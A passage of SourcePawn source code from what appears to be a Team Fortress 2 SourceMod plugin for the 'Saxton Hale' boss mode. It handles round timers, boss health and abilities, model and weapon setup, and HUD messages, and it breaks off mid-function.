	if (Special==4)
	{
		EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, _, pos, NULL_VECTOR, false, 0.0);
		EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, _, pos, NULL_VECTOR, false, 0.0);
	}
	return Plugin_Continue;
}


public Action:CheckPlayersTimer(Handle:hTimer)
{
	new i,j;
	for(i=1;i<=MaxClients;i++)
	if(IsValidEdict(i) && IsClientInGame(i) && (GetClientTeam(i)>1))
	{
		j++;
		if (j>=2)
		{
			ServerCommand("mp_restartgame 1");
			KillTimer(hTimer);
			return Plugin_Continue;
		}
	}
	return Plugin_Continue;
}

public Action:StartHaleTimer(Handle:hTimer)
{
	CreateTimer(0.25, GottamTimer);
	if (!bArena)
		for (new i=1;i<=MaxClients;i++)
			if (IsValidEdict(i) && IsClientInGame(i) && !IsPlayerAlive(i))
				TF2_RespawnPlayer(i);	
	if (!IsClientInGame(Hale) || !IsPlayerAlive(Hale))
	{
		RoundState=2;
		return Plugin_Continue;		
	}	
	playing=0;
	for (new client=1;client<=MaxClients;client++)
	if (IsValidEdict(client) && IsClientInGame(client) && (client!=Hale) && (IsPlayerAlive(client))) 
	{	
		bonplay[client]=true;
		playing++;		
		CreateTimer(0.1, MakeNoHale, client);
	}
	if ((playing>10) && (Special==2))
		playing-=(playing-10)/3;
	HaleHealthMax=RoundFloat(Pow(((250.0+(playing-1))*(playing-1)),1.155));
	if (HaleHealthMax==0)
		HaleHealthMax=500;	
	SetEntProp(Hale, Prop_Data, "m_iMaxHealth",HaleHealthMax);
	SetEntProp(Hale, Prop_Data, "m_iHealth",HaleHealthMax);
	HaleHealth=HaleHealthMax;
	CreateTimer(0.2, HaleTimer, Hale, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
	CreateTimer(0.2, StartRound);
	CreateTimer(0.2, ClientTimer, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
	return Plugin_Continue;
}

public Action:GottamTimer(Handle:hTimer)
{
	for (new i=1;i<=MaxClients;i++)
		if (IsValidEdict(i) && IsClientInGame(i) && IsPlayerAlive(i))
			SetEntityMoveType(i, MOVETYPE_WALK);
}
	
public Action:StartRound(Handle:hTimer)
{
	RoundState=1;		
	if (IsValidEdict(Hale) && IsClientInGame(Hale) && (GetClientTeam(Hale)==HaleTeam) && ((GetPlayerWeaponSlot(Hale, 2)<=0) || !IsValidEdict(GetPlayerWeaponSlot(Hale, 2))))
		EquipSaxton(Hale);
	return Plugin_Continue;
}

public Action:EnableSG(Handle:hTimer,any:i)
{	
	if ((RoundState==1) && IsValidEdict(i) && (i>0))
	{
		new String:s[64];
		GetEdictClassname(i, s, 64);
		if (StrEqual(s,"obj_sentrygun"))
		{
			SetEntProp(i, Prop_Send, "m_bDisabled", 0);
			
			for (new ent=MaxClients+1;ent<ME;ent++)
			if (IsValidEdict(ent))
			{
				new String:s2[64];
				GetEdictClassname(ent, s2, 64);
				if (StrEqual(s2,"info_particle_system") && (GetEntPropEnt(ent, Prop_Data, "m_hOwnerEntity")==i))
					RemoveEdict(ent);
			}
		}
	}
	return Plugin_Continue;
}

public Action:RemoveEnt(Handle:timer, any:ent)
{
	if (IsValidEntity(ent) && (ent>0))
		RemoveEdict(ent);
	return Plugin_Continue;
}

public Action:MessageTimer(Handle:hTimer,any:client)
{
	if (!IsValidEdict(Hale) || (Hale<=0) || !IsClientInGame(Hale) || ((client!=9001) && !IsClientInGame(client)))
		return Plugin_Continue;
	
	new String:s[64];
	new String:s9001[365];
	if (IsClientInGame(Hale))
		GetClientName(Hale, s, 64);
	if (Special==1)
	{
		Format(s9001,365,"==SPECIAL ROUND==\n%s became\nVAGINEER\nwith %i HP.",s,HaleHealthMax);
		SetHudTextParams(-1.0, 0.4, 10.0, 255, 255, 255, 255);
		if (client!=9001)
			ShowHudText(client, -1, s9001);
		else
			for (new i = 1; i <= MaxClients; i++)
				if (IsClientInGame(i))
					ShowHudText(i, -1, s9001);
	}
	else if (Special==2)
	{
		Format(s9001,365,"==SPECIAL ROUND==\n%s became\nHORSLESS HEADLESS HORSEMANN JUNIOR\nwith %i HP.",s,HaleHealthMax);
		SetHudTextParams(-1.0, 0.4, 10.0, 255, 255, 255, 255);
		if (client!=9001)
			ShowHudText(client, -1, s9001);
		else
			for (new i = 1; i <= MaxClients; i++)
				if (IsClientInGame(i))
					ShowHudText(i, -1, s9001);
	}
	else if (Special==4)
	{
		Format(s9001,365,"==Merry Christmas and Happy New Year==\n%s became\nCHRISTIAN BRUTAL SNIPER\nwith %i HP.",s,HaleHealthMax);
		SetHudTextParams(-1.0, 0.4, 10.0, 255, 255, 255, 255);
		if (client!=9001)
			ShowHudText(client, -1, s9001);
		else
			for (new i = 1; i <= MaxClients; i++)
				if (IsClientInGame(i))
					ShowHudText(i, -1, s9001);
	}
	else
	{
		Format(s9001,365,"%s became\nSaxton Hale\nwith %i HP.",s,HaleHealthMax);
		SetHudTextParams(-1.0, 0.4, 10.0, 255, 255, 255, 255);
		if (client!=9001)
			ShowHudText(client, -1, s9001);
		else
			for (new i = 1; i <= MaxClients; i++)
				if (IsClientInGame(i))
					ShowHudText(i, -1, s9001);
	}
	return Plugin_Continue;
}

public Action:MakeModelTimer(Handle:hTimer)
{		
	if (!IsValidEdict(Hale) || !IsClientInGame(Hale) || !IsPlayerAlive(Hale) || (RoundState==2))
	{
		KillTimer(hTimer);
		return Plugin_Continue;
	}
	if (IsValidEdict(HaleModelAT[0]) && (HaleModelAT[0]>0))
		RemoveEdict(HaleModelAT[0]);
	if (IsValidEdict(HaleModelAT[1]) && (HaleModelAT[1]>0))
	{
		if (Attachable_IsHooked(HaleModelAT[1]))
			Attachable_UnhookEntity(HaleModelAT[1]);
		RemoveEdict(HaleModelAT[1]);
	}
	if (IsValidEdict(HaleModelAT[2]) && (HaleModelAT[2]>0))
	{
		if (Attachable_IsHooked(HaleModelAT[2]))
			Attachable_UnhookEntity(HaleModelAT[2]);
		RemoveEdict(HaleModelAT[2]);
	}
	if (IsValidEdict(HaleModelAT[3]) && (HaleModelAT[3]>0))
		RemoveEdict(HaleModelAT[3]);
	decl p;
	for (p=0;p<=3;p+=3)
	if (!((p==3) && (Special!=2)))
	{
		HaleModelAT[p] = CreateEntityByName("tf_wearable_item");
		if ((HaleModelAT[p]<=0) || IsValidEdict(HaleModelAT[p]))
		{
			SetEntProp(HaleModelAT[p], Prop_Send, "m_CollisionGroup", 11);
			DispatchSpawn(HaleModelAT[p]);
			if (Special==1)
			{
				if (p==0)
					SetEntityModel(HaleModelAT[0], VagineerModel);
			}
			else if (Special==2)
			{
				if (p==0)
					SetEntityModel(HaleModelAT[0], HHHModel);
				if (p==3)
					SetEntityModel(HaleModelAT[3], AxeModel);
			}
			else if (Special==0)
				SetEntityModel(HaleModelAT[0], HaleModel);
			if (Special!=4)
			{
				SetEntPropEnt(HaleModelAT[p], Prop_Data, "m_hOwnerEntity",Hale);
				SDKCall(EquipWearable, Hale, HaleModelAT[p]);
			}
		}
	}
	for (p=1;p<3;p++)
	if (!((p==2) && (Special==0)))
	{
		if ((HaleModelAT[p]<=0) || !IsValidEdict(HaleModelAT[p]))
			HaleModelAT[p] = Attachable_CreateAttachable(Hale);
		else
		{
			new String:s[64];
			GetEdictClassname(HaleModelAT[p], s, sizeof(s));
			if (!StrEqual(s,"tf_wearable_item"))
				HaleModelAT[p] = Attachable_CreateAttachable(Hale);
		}
	}
	if (IsValidEdict(HaleModelAT[1]))
	{
		if (Special==1)
			SetEntityModel(HaleModelAT[1], VagineerModel);
		else if (Special==2)
			SetEntityModel(HaleModelAT[1], HHHModel);
		else if (Special==0)
			SetEntityModel(HaleModelAT[1], HaleModel);
	}
	if (IsValidEdict(HaleModelAT[2]))
	{
		if (Special==1)
			SetEntityModel(HaleModelAT[2], WrenchModel);
		else if (Special==4)
			SetEntityModel(HaleModelAT[2], ShivModel);
		else if (Special==2)
			SetEntityModel(HaleModelAT[2], AxeModel);
	}
	return Plugin_Continue;
}

EquipSaxton(client)
{
	new SaxtonWeapon=GetPlayerWeaponSlot(client, 2);
	new String:s[32];
	TF2_RemoveAllWeapons(client);
	if (Special==0)
	{
		SaxtonWeapon = SpawnWeapon(client,"tf_weapon_shovel",6,101,5,"68 ; 2 ; 2 ; 3.0");
		//SaxtonWeapon = SDKCall(GiveNamedItem, client, "tf_weapon_shovel", 0,0);
		//SDKCall(WeaponEquip, client, SaxtonWeapon);
		SetEntPropEnt(client, Prop_Send, "m_hActiveWeapon", SaxtonWeapon);
		SetEntityRenderMode(SaxtonWeapon, RENDER_TRANSCOLOR);
		SetEntityRenderColor(SaxtonWeapon, 255, 255, 255, 0);
		HaleCharge=0;
	}
	else if (Special==2)
	{
		SaxtonWeapon = SpawnWeapon(client,"tf_weapon_sword",266,101,5,"68 ; 2 ; 2 ; 3.0");
		//SaxtonWeapon = SDKCall(GiveNamedItem, client, "tf_weapon_sword", 0,0);
		//SDKCall(WeaponEquip, client, SaxtonWeapon);
		SetEntPropEnt(client, Prop_Send, "m_hActiveWeapon", SaxtonWeapon);
		HaleCharge=-500;
	}
	else if (Special==4)
	{
		SaxtonWeapon = SpawnWeapon(client,"tf_weapon_club",171,101,5,"68 ; 2 ; 2 ; 3.0");
		//SaxtonWeapon = SDKCall(GiveNamedItem, client, "tf_weapon_club", 0,0);
		//SDKCall(WeaponEquip, client, SaxtonWeapon);
		SetEntPropEnt(client, Prop_Send, "m_hActiveWeapon", SaxtonWeapon);
		HaleCharge=0;
		SetEntProp(client, Prop_Send, "m_nBody", 0);
	}
	else
	{
		SaxtonWeapon = SpawnWeapon(client,"tf_weapon_wrench",7,101,i,"68 ; 2 ; 2 ; 3.0");
		//SaxtonWeapon = SDKCall(GiveNamedItem, client, "tf_weapon_wrench", 0,0);
		//SDKCall(WeaponEquip, client, SaxtonWeapon);
		SetEntPropEnt(client, Prop_Send, "m_hActiveWeapon", GetPlayerWeaponSlot(client, 2));
		SetEntProp(client, Prop_Send, "m_nBody", (1 << 0));
		HaleCharge=0;
	}
}

public Action:MakeHale(Handle:hTimer,any:client)
{
	if (!IsValidEdict(client) || !IsClientInGame(client))
		return Plugin_Continue;
	if (Special==1)
		TF2_SetPlayerClass(client, TFClass_Engineer);
	else if (Special==2)
		TF2_SetPlayerClass(client, TFClass_DemoMan);
	else if (Special==4)
		TF2_SetPlayerClass(client, TFClass_Sniper);
	else
		TF2_SetPlayerClass(client, TFClass_Soldier);
	ChangeClientTeam(client, HaleTeam);
	
	if (RoundState==0)
		return Plugin_Continue;
	
	CreateTimer(0.2, MakeModelTimer,_);
	CreateTimer(20.0, MakeModelTimer,_,TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
	
	if (!IsPlayerAlive(client))
		return Plugin_Continue;
	
	if (!bArena && (RoundState<1))		
		SetEntityMoveType(client, MOVETYPE_NONE);
	
	if ((Special==0) || (Special==2))
	{
		SetEntityRenderMode(client, RENDER_TRANSCOLOR);
		SetEntityRenderColor(client, 255, 255, 255, 0);
	}	
	else
	{
		SetEntityRenderMode(client, RENDER_TRANSCOLOR);
		SetEntityRenderColor(client, 255, 255, 255, 255);
	}	
	
	new ent=-1;
	while ((ent = FindEntityByClassname(ent, "tf_wearable_item")) != INVALID_ENT_REFERENCE)
	{
		if (GetEntPropEnt(ent, Prop_Data, "m_hOwnerEntity")==client)
			AcceptEntityInput(ent, "kill");
	}	
	while ((ent = FindEntityByClassname(ent, "tf_wearable_item_demoshield")) != INVALID_ENT_REFERENCE)
	{
		if (GetEntPropEnt(ent, Prop_Data, "m_hOwnerEntity")==client)
			AcceptEntityInput(ent, "kill");
	}	

	EquipSaxton(Hale);
	HintPanel(Hale,0);
		
	return Plugin_Continue;
}

public Action:MakeNoHale(Handle:hTimer,any:client)
{
	if (!IsValidEdict(client) || !IsClientInGame(client) || (RoundState==2))
		return Plugin_Continue;
		
	if (!bArena && (RoundState<1))		
		SetEntityMoveType(client, MOVETYPE_NONE);
	
	if (bArena || (RoundState<1) || (HaleHealth==HaleHealthMax))
		ChangeClientTeam(client, Team);
	else if (bArena && (RoundState==1) && IsPlayerAlive(client))
		FakeClientCommand(client,"kill");
	else
		ChangeClientTeam(client, 1);

	if (!IsPlayerAlive(client))
		return Plugin_Continue;
	
	SetEntityRenderColor(client, 255, 255, 255, 255);	
	//TF2_RemoveCondition(client, TFCond_Kritzkrieged);	
	decl String:s[512];
	if (RoundState<1)
	{
		switch (TF2_GetPlayerClass(client))
		{
			case TFClass_Scout:
				Format(s,256,"The Crit-A-Cola gives criticals instead of mini-crits.");
			case TFClass_Soldier:
				Format(s,256,"The battalion's backup is replaced with a shotgun.");
			case TFClass_Pyro:
				Format(s,256,"Cuted ammo limit. The classlimit 3.");
			case TFClass_DemoMan:
				Format(s,256,"The Chargin' Targe blocks one hit from Saxton.");
			case TFClass_Heavy:
				Format(s,256,"Natasha is not allowed.");
			case TFClass_Engineer:
				Format(s,256,"Only small metal packs.\nThe classlimit is 3.");
			case TFClass_Medic:
				Format(s,256,"Spawn with 40 percent of charge.\n150 percent after activation.");
			case TFClass_Sniper:
				Format(s,256,"Your weapons has only critical hits. Secondary is SMG.");
			case TFClass_Spy:
				Format(s,256,"A backstab does ~10 percent damage of max Hale's health.\nThe Classlimit is 3.");
		}
	}
	new Handle:panel = CreatePanel();
	if (TF2_GetPlayerClass(client)!=TFClass_Sniper)
		Format(s,300,"All melee weapons (except spy's knifes) has only critical hits.\n%s",s);
	SetPanelTitle(panel,s);	
	DrawPanelItem(panel,"Exit");
	SendPanelToClient(panel, client, QueuePanelH, 20);
	CloseHandle(panel);
	
	new String:mapname[99];
	GetCurrentMap(mapname, sizeof(mapname));
	if (tf_medieval)
		return Plugin_Continue;
	
	new weapon=GetPlayerWeaponSlot(client, 0);
	new index;
	if (IsValidEdict(weapon) && (weapon>0))
	{
		index=GetEntProp(weapon, Prop_Send, "m_iItemDefinitionIndex");
		GetEdictClassname(weapon, s, sizeof(s));
		if (index==41)
		{
			TF2_RemoveWeaponSlot(client, 0);
			weapon = SpawnWeapon(client,"tf_weapon_minigun",15,0,6,"");
			//weapon = SDKCall(GiveNamedItem, client, "tf_weapon_minigun", 0,0);
			//SDKCall(WeaponEquip, client, weapon);
		}	
		else if (index==237)
		{
			TF2_RemoveWeaponSlot(client, 0);
			weapon = SpawnWeapon(client,"tf_weapon_rocketlauncher",18,1,6,"");
			//weapon = SDKCall(GiveNamedItem, client, "tf_weapon_rocketlauncher", 0,0);
			//SDKCall(WeaponEquip, client, weapon);
			SetAmmo(client,0,20);
			SetEntProp(client, Prop_Data, "m_iHealth",200);
		}
	}
	weapon=GetPlayerWeaponSlot(client, 1);
	if (IsValidEdict(weapon) && (weapon>0))
	{
		index=GetEntProp(weapon, Prop_Send, "m_iItemDefinitionIndex");
		GetEdictClassname(weapon, s, sizeof(s));
		weapon=-5;		
		if (index==226)
		{
			TF2_RemoveWeaponSlot(client, 1);
			weapon = SpawnWeapon(client,"tf_weapon_shotgun_soldier",10,5,6,"");
			//weapon = SDKCall(GiveNamedItem, client, "tf_weapon_shotgun_soldier", 0,0);
			//SDKCall(WeaponEquip, client, weapon);
		}
		else if ((index==57) || (index==58) || (index==231))
		{
			TF2_RemoveWeaponSlot(client, 1);
			weapon = SpawnWeapon(client,"tf_weapon_smg",16,1,6,"");
			//weapon = SDKCall(GiveNamedItem, client, "tf_weapon_smg", 0,0);
			//SDKCall(WeaponEquip, client, weapon);
		}
		else if (index==265)
		{
			TF2_RemoveWeaponSlot(client, 1);
			weapon = SpawnWeapon(client,"tf_weapon_pipebomblauncher",20,1,6,"");
			//weapon = SDKCall(GiveNamedItem, client, "tf_weapon_pipebomblauncher", 0,0);
			//SDKCall(WeaponEquip, client, weapon);
			SetAmmo(client,1,24);
			SetEntProp(client, Prop_Data, "m_iHealth",175);
		}
		else if ((index==29) || (index==211))
		{
			TF2_RemoveWeaponSlot(client, 1);
			weapon = SpawnWeapon(client,"tf_weapon_medigun",35,5,6,"18 ; 1 ; 10 ; 1.3");
		}
	}
	if (TF2_GetPlayerClass(client) == TFClass_Sniper)
	{
		weapon = SpawnWeapon(client,"tf_weapon_smg",16,1,6,"");
		//weapon = SDKCall(GiveNamedItem, client, "tf_weapon_smg", 0,0);
		//SDKCall(WeaponEquip, client, weapon);
	}
	else if (TF2_GetPlayerClass(client) == TFClass_Medic)	
	{
		new medigun = GetPlayerWeaponSlot(client, 1);
		if (IsValidEdict(medigun) && (medigun > 0))
		{
			GetEdictClassname(medigun, s, sizeof(s));
			if (StrEqual(s,"tf_weapon_medigun"))
				SetEntPropFloat(medigun, Prop_Send, "m_flChargeLevel",0.41);	
		}
	}
	else if (TF2_GetPlayerClass(client) == TFClass_Pyro)	
		CreateTimer(0.2, PyroTimer, client, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
	
	return Plugin_Continue;
}

public Action:event_changeclass(Handle:event, const String:name[], bool:dontBroadcast)
{
	if (!Enabled)
		return Plugin_Continue;
	new client=GetClientOfUserId(GetEventInt(event, "userid"));	
	
	for (new ionplay=1;ionplay<=MaxClients;ionplay++)
	if (IsValidEdict(ionplay) && IsClientInGame(ionplay) && (ionplay!=Hale) && (GetClientTeam(ionplay)==HaleTeam)) 
		ChangeClientTeam(ionplay, Team);
	
	if ((client==Hale) && (TF2_GetPlayerClass(client)!=TFClass_Soldier) && (Special==0))
		TF2_SetPlayerClass(client, TFClass_Soldier);
	else if ((client==Hale) && (TF2_GetPlayerClass(client)!=TFClass_Engineer) && (Special==1))
		TF2_SetPlayerClass(client, TFClass_Engineer);
	else if ((client==Hale) && (TF2_GetPlayerClass(client)!=TFClass_DemoMan) && (Special==2))
		TF2_SetPlayerClass(client, TFClass_DemoMan);
	else if ((client==Hale) && (TF2_GetPlayerClass(client)!=TFClass_Sniper) && (Special==4))
		TF2_SetPlayerClass(client, TFClass_Sniper);	
	return Plugin_Continue;
}

public Action:event_lazor(Handle:event, const String:name[], bool:dontBroadcast)
{
	if (!Enabled)
		return Plugin_Continue;
	new client=GetClientOfUserId(GetEventInt(event, "userid"));
	decl String:s[64];
	if (IsValidEdict(client) && IsClientInGame(client) && IsPlayerAlive(client))
	{
		new medigun = GetPlayerWeaponSlot(client, 1);
		
		if (IsValidEdict(medigun) && (medigun > 0))
		{
			GetEdictClassname(medigun, s, sizeof(s));
			if (StrEqual(s,"tf_weapon_medigun"))
			{
				SetEntPropFloat(medigun, Prop_Send, "m_flChargeLevel",1.51);			
				CreateTimer(0.4,Timer_Lazor,medigun,TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
			}
		}
	}	
	return Plugin_Continue;
}

public Action:Timer_Lazor(Handle:hTimer,any:medigun)
{
	if (IsValidEdict(medigun) && (medigun > 0) && (RoundState==1))
	{
		new client=GetEntPropEnt(medigun, Prop_Data, "m_hOwnerEntity");		
		new weapon=GetEntPropEnt(client, Prop_Send, "m_hActiveWeapon");
		new Float:charge=GetEntPropFloat(medigun, Prop_Send, "m_flChargeLevel");
		if (weapon==medigun)
		{
			new target=GetHealingTarget(client);
			if (charge>0.15)
			{		
				TF2_AddCondition(client,TFCond_Ubercharged,0.5);		
				if ((target>0) && IsValidEdict(target))	
					TF2_AddCondition(target,TFCond_Ubercharged,0.5);	
			}
		}
		if ((charge<=0.02) && !TF2_HasCond(client,5) && !TF2_HasCond(client,11))
		{
			SetEntPropFloat(medigun, Prop_Send, "m_flChargeLevel",0.41);	
			TF2_RemoveCondition(client,TFCond_Ubercharged);	
			KillTimer(hTimer);
		}
	}
	else
		KillTimer(hTimer);
	return Plugin_Continue;
}


public Action:Command_GetHP(client, args)
{
	if (!Enabled || (RoundState!=1))
		return Plugin_Continue;	
	if (client==Hale)
	{
		if (Special==1)
			PrintCenterTextAll("Vagineer showed his current HP: %i of %i",HaleHealth,HaleHealthMax);	
		else if (Special==2)
			PrintCenterTextAll("Horseless Headless Horsemann Junior showed his current HP: %i of %i",HaleHealth,HaleHealthMax);
		else if (Special==4)
			PrintCenterTextAll("Christian Brutal Sniper showed his current HP: %i of %i",HaleHealth,HaleHealthMax);
		else
			PrintCenterTextAll("Saxton Hale showed his current HP: %i of %i",HaleHealth,HaleHealthMax);	
	}
	else if ((used<3) && (RoundFloat(HPTime)<=0))
	{
		used++;
		if (Special==1)
		{
			PrintCenterTextAll("Vagineer's Current health - %i of %i",HaleHealth,HaleHealthMax);	
			PrintToChatAll("Vagineer's Current health - %i of %i",HaleHealth,HaleHealthMax);	
		}
		else if (Special==2)
		{
			PrintCenterTextAll("Horseless Headless Horsemann's Current health - %i of %i",HaleHealth,HaleHealthMax);	
			PrintToChatAll("Horseless Headless Horsemann's Current health - %i of %i",HaleHealth,HaleHealthMax);	
		}
		else if (Special==4)
		{
			PrintCenterTextAll("Christian Brutal Sniper's current health - %i of %i",HaleHealth,HaleHealthMax);	
			PrintToChatAll("Christian Brutal Sniper's current health - %i of %i",HaleHealth,HaleHealthMax);
		}
		else
		{
			PrintCenterTextAll("Hale's Current health - %i of %i",HaleHealth,HaleHealthMax);	
			PrintToChatAll("Hale's Current health - %i of %i",HaleHealth,HaleHealthMax);	
		}
		HPTime=20.0;
	}
	else if (used>3)
		PrintToChat(client, "You can no longer check his health in this round (only 3 checks per round)");	
	else
		PrintToChat(client, "You can not see his HP now (wait %i seconds)",RoundFloat(HPTime));
	
	return Plugin_Continue;	
}

public Action:Command_Vagineer(client, args)
{
	Incoming=1;
	return Plugin_Continue;	
}


public Action:Command_HHH(client, args)
{
	Incoming=2;
	return Plugin_Continue;	
}

public Action:Command_NextHale(client, args)
{
	if (Enabled)
		CreateTimer(0.2, MessageTimer);	
	return Plugin_Continue;	
}

public Action:Command_Hale(client, args)
{
	if (!Enabled)
		return Plugin_Continue;	
	decl String:s[80];
	decl String:targetname[256];
	GetCmdArg(1, targetname, sizeof(targetname));	
	if (StrContains(targetname,"@me",false)==0)
		ForceHale(client,client);
	else
		for (new target=1;target<=MaxClients;target++)
		if(IsValidEdict(target) && IsClientInGame(target))		
		{
			GetClientName(target, s, 64);
			if (StrContains(s,targetname,false)==0)	
			{
				ForceHale(client,target);
				break;
			}
		}
		
	return Plugin_Continue;	
}

public ForceHale(admin,client)
{
	NextHale=client;
	new String:s1[64];
	GetClientName(client, s1, 64);
	PrintToChatAll("%s will become Saxton Hale next round",s1);
}

public OnClientPutInServer(client)
{
	if (Enabled)
	{
		bHelped[client]=false;
	}
}

public OnClientDisconnect(client)
{
	if ((Enabled) && (client==Hale))
	{
		ForceTeamWin(Team);
		new tHale=FindNextHale(Hale);
		if (IsClientInGame(tHale))
			ChangeClientTeam(tHale, HaleTeam);
	}	
}

public Action:event_player_spawn(Handle:event, const String:name[], bool:dontBroadcast)
{
	if (!Enabled)
		return Plugin_Continue;
	new client=GetClientOfUserId(GetEventInt(event, "userid"));	
	if (client<=0)
		return Plugin_Continue;
	
	SDKHook(client, SDKHook_OnTakeDamage, TakeDamageHook);
	
	if ((client==Hale) && (RoundState<2))
		CreateTimer(0.1, MakeHale, Hale);
	else
		CreateTimer(0.1, MakeNoHale, client);
		
	if (!bHelped[client])
	{
		HelpPanel(client,0);
		bHelped[client]=true;
	}
	return Plugin_Continue;
}

public Action:ClientTimer(Handle:hTimer)
{
	decl TFCond:cond;
	if (RoundState>1)
		KillTimer(hTimer);
	for(new client=1;client<=MaxClients;client++)
	if(IsClientInGame(client) && (client!=Hale) && IsPlayerAlive(client) && (GetClientTeam(client)==Team))
	{	
		cond=TFCond_Kritzkrieged;
		for(new i=1;i<MaxClients;i++)
			if(IsClientInGame(i) && IsPlayerAlive(i) && (GetHealingTarget(i)==client))
			{
				cond=TFCond_Buffed;
				break;
			}
			
		new weapon=GetEntPropEnt(client, Prop_Data, "m_hActiveWeapon");
		
		if ((weapon>0) && IsValidEdict(weapon) && (weapon==GetPlayerWeaponSlot(client, 2)) && (TF2_GetPlayerClass(client)!=TFClass_Spy))
		{
			TF2_AddCondition(client,cond,0.3);
			continue;
		}
		if ((TF2_GetPlayerClass(client)==TFClass_Sniper) || bLastAnnounced || TF2_HasCond(client,19)) 
			TF2_AddCondition(client,cond,0.3);
		else if ((TF2_GetPlayerClass(client)==TFClass_Medic) && (weapon==GetPlayerWeaponSlot(client, 0)))
			TF2_AddCondition(client,cond,0.3);
	}
	return Plugin_Continue;
}

public Action:HaleTimer(Handle:hTimer,any:client)
{
	if (RoundState==2)
		KillTimer(hTimer);
		
	if (!IsValidEdict(client) || !IsClientInGame(client))
		return Plugin_Continue;
	/*if (TF2_HasCond(client,27))
	{
		TF2_RemoveCondition(client,TFCond_Milked);
		TF2_AddCondition(client,TFCond_Jarated,10.0);
	}*/
	if (TF2_HasCond(client,24))
	{
		TF2_RemoveCondition(client,TFCond_Jarated);	
	}
	new Float:speed=HaleSpeed+0.7*(100-HaleHealth*100/HaleHealthMax);
	if ((Special==1) && TF2_HasCond(client,7))
		speed+=100.0;
	SetEntPropFloat(client, Prop_Data, "m_flMaxspeed", speed); 
	SetEntProp(client, Prop_Data, "m_iHealth",HaleHealth);

	SetHudTextParams(-1.0, 0.77, 0.15, 255, 255, 255, 255);
	ShowHudText(client, -1, "Health: %i of %i",HaleHealth,HaleHealthMax);
	if (HaleRage/RageDMG==1)
	{
		SetHudTextParams(-1.0, 0.83, 0.15, 255, 64, 64, 255);
		ShowHudText(client, -1,"Do taunt to do RAGE.");
	}
	else
	{
		SetHudTextParams(-1.0, 0.83, 0.15, 255, 255, 255, 255);
		ShowHudText(client, -1,"RAGE meter: %i percent",HaleRage*100/RageDMG);
	}
	SetHudTextParams(-1.0, 0.88, 0.15, 255, 255, 255, 255);
	
	new buttons=GetClientButtons(client);
	if ((buttons & IN_DUCK) && (HaleCharge>=0) && !(buttons & IN_JUMP))
	{
		if (Special==2)
		{
			if (HaleCharge+5<50)
				HaleCharge+=5;
			else
				HaleCharge=50;
			ShowHudText(client, -1, "Teleport status: %i percent. You will be teleported on 100 percent when you stand up.",HaleCharge*2);
		}
		else
		{
			if (HaleCharge+5<25)
				HaleCharge+=5;
			else
				HaleCharge=25;
			ShowHudText(client, -1, "Jump charge status: %i percent. Look up and stand up to do super-jump.",HaleCharge*4);
		}
	}
	else if (HaleCharge<0)
	{
		HaleCharge+=5;
		if (Special==2)
			ShowHudText(client, -1, "Teleporter will be ready again in %i",-HaleCharge/20);
		else
			ShowHudText(client, -1, "Super-jump will be ready again in %i",-HaleCharge/20);
	}
	else
	{
		new Float:ang[3];
		GetClientEyeAngles(client, ang);
		if ((ang[0]<-45.0) && (HaleCharge>1))
		{
			if ((Special==2) && (HaleCharge==50))
			{
				new Float:pos[3];
				decl target;
				do
				{
					target=GetRandomInt(1,MaxClients);
				}
				while ((RedAlivePlayers>0) && (!IsValidEdict(target) || (target==Hale) || !IsPlayerAlive(target)));
				
				GetEntPropVector(target, Prop_Data, "m_vecOrigin", pos);
				TeleportEntity(Hale, pos, NULL_VECTOR, NULL_VECTOR);
				CreateTimer(3.0, RemoveEnt, AttachParticle(Hale,"ghost_appearation"));		
				TF2_StunPlayer(Hale, 2.0, 0.0, TF_STUNFLAGS_GHOSTSCARE|TF_STUNFLAG_NOSOUNDOREFFECT, target);
				HaleCharge=-1100;
			}
			else if (Special!=2)
			{
				decl Float:vel[3];
				GetEntPropVector(client, Prop_Data, "m_vecVelocity", vel);
				vel[2]=750+Sine(Float:HaleCharge)*13.0;
				vel[0]*=2*Cosine(Float:HaleCharge);
				vel[1]*=2*Cosine(Float:HaleCharge);
				TeleportEntity(client, NULL_VECTOR, NULL_VECTOR, vel);
				HaleCharge=-120;
				if (bNewResponces && !Special)
				{
					decl String:s[256];
					decl Float:pos[3];
					GetEntPropVector(client, Prop_Send, "m_vecOrigin", pos);
					Format(s,256,"../%s%i.mdl",HaleJump,GetRandomInt(1,2));
					EmitSoundToAll(s, client, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
					EmitSoundToAll(s, client, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
					for (new i=1; i<=MaxClients; i++)
						if (IsClientInGame(i) && (i!=Hale))
						{
							EmitSoundToClient(i,s, client, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
							EmitSoundToClient(i,s, client, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, client, pos, NULL_VECTOR, true, 0.0);
						}
				}
			}
		}
		else
			HaleCharge=0;
	}
	
	RedAlivePlayers=0;
	for(new i=1; i<=MaxClients;i++)
	if(IsClientInGame(i) && IsPlayerAlive(i) && (GetClientTeam(i)==Team))
		RedAlivePlayers++;
	if (RedAlivePlayers==0)
		ForceTeamWin(HaleTeam);
	else if (RedAlivePlayers==1)
	{
		if (!bLastAnnounced)
		{
			new Float:pos[3];
			new String:s[256];
			GetEntPropVector(client, Prop_Send, "m_vecOrigin", pos);
			bLastAnnounced=true;	
			if (Special!=2)
			{
				if (Special==4)
				{
					if (!GetRandomInt(0,2))
						Format(s,256,"%s",CBS0);
					else
					{
						new a=GetRandomInt(1,25);
						if (a<10)
							Format(s,256,"%s0%i.wav",CBS4,a);
						else
							Format(s,256,"%s%i.wav",CBS4,a);
					}
